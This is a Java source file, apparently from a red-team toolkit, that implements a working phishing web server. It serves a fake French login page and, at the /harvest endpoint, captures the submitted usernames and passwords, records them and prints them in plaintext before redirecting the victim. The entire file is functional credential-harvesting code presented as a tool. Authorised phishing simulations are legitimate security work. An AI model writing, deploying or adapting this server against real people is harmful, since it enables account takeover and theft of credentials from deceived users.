package fr.redteam.web;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

/**
 * Serveur HTTP minimal : GET / = page de login phishing, POST /harvest = enregistre login/password.
 */
public class PhishingHttpServer {

    private final String host;
    private final int port;
    private final PhishingPageGenerator pageGenerator;
    private final CredentialHarvester harvester;
    private HttpServer server;

    public PhishingHttpServer(String host, int port, PhishingPageGenerator pageGenerator, CredentialHarvester harvester) {
        this.host = host != null ? host : "0.0.0.0";
        this.port = port > 0 ? port : 8080;
        this.pageGenerator = pageGenerator != null ? pageGenerator : new PhishingPageGenerator();
        this.harvester = harvester != null ? harvester : new CredentialHarvester();
    }

    public void start() throws IOException {
        server = HttpServer.create(new InetSocketAddress(host, port), 0);
        server.createContext("/", this::handleRoot);
        server.createContext("/harvest", this::handleHarvest);
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
    }

    public void stop() {
        if (server != null) {
            server.stop(0);
        }
    }

    private void handleRoot(HttpExchange ex) throws IOException {
        if (!"GET".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "Method Not Allowed");
            return;
        }
        String html = pageGenerator.generate("Connexion - Veuillez vous authentifier", "/harvest", "Accès réservé.");
        byte[] body = html.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
        ex.sendResponseHeaders(200, body.length);
        try (OutputStream out = ex.getResponseBody()) {
            out.write(body);
        }
    }

    private void handleHarvest(HttpExchange ex) throws IOException {
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "Method Not Allowed");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        String login = null, password = null;
        for (String part : body.split("&")) {
            String[] kv = part.split("=", 2);
            if (kv.length == 2) {
                String k = java.net.URLDecoder.decode(kv[0].trim(), StandardCharsets.UTF_8);
                String v = java.net.URLDecoder.decode(kv[1].trim(), StandardCharsets.UTF_8);
                if ("login".equalsIgnoreCase(k)) login = v;
                if ("password".equalsIgnoreCase(k)) password = v;
            }
        }
        if (login != null) {
            harvester.recordCredential(login, password);
            System.out.println("[Harvest] " + login + ":" + (password != null ? password : ""));
        }
        ex.getResponseHeaders().add("Location", "/");
        ex.sendResponseHeaders(302, -1);
        ex.close();
    }

    private void send(HttpExchange ex, int code, String message) throws IOException {
        byte[] body = message.getBytes(StandardCharsets.UTF_8);
        ex.sendResponseHeaders(code, body.length);
        try (OutputStream out = ex.getResponseBody()) {
            out.write(body);
        }
    }

    public int getPort() {
        return port;
    }

    public String getHost() {
        return host;
    }

    public CredentialHarvester getHarvester() {
        return harvester;
    }
}
